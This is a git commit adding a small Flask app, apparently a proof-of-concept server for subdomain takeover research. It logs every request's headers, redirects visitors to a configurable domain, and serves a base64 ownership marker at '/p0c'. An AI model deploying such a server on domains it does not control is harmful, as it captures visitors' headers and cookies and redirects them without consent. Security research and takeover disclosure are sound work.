78c843f218bc3cd7c5c8ceb0696daaa916b77c81
Rafael Marrara <rafael@marrara.net>
2023-12-08 23:25:19 -0800

    add app domain takeover

---
+++ app_subdomain_takeover/app.py
@@ -0,0 +1,18 @@
+from os import environ
+from flask import Flask, request, redirect
+
+app = Flask(__name__)
+REDIRECT_DOMAIN = environ.get('REDIRECT_DOMAIN')
+
+@app.route('/')
+def hello():
+    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=", flush=True)
+    print(f"Request headers: {request.headers}", flush=True)
+    print(f"Redirect to {REDIRECT_DOMAIN}", flush=True)
+    return redirect(f"http://{REDIRECT_DOMAIN}", code=302)
+
+@app.route('/p0c')
+def p0c():
+    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=", flush=True)
+    print(f"Request headers: {request.headers}", flush=True)
+    return 'Uk1hcnJhcmE='
